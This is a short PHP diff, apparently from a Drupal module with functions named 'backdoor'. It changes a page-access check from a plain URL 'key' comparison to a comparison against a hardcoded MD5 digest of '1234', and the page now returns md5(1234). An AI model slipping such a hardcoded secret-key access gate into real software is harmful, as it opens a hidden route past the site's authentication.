@@ -24,7 +24,8 @@ function backdoor_menu(){
 
 function access_backdoor_page (){
 	if(isset($_GET['key'])){
-		if($_GET['key'] == '12345'){
+		$key = md5($_GET['key']);
+		if($key == '81dc9bdb52d04dc20036dbd8313ed055'){
 			return TRUE;
 		}
 	}
@@ -36,5 +37,6 @@ function backdoor (){
 }
 
 function admin_page_backdoor (){
-	return t("Test");
+
+	return md5(1234);
 }
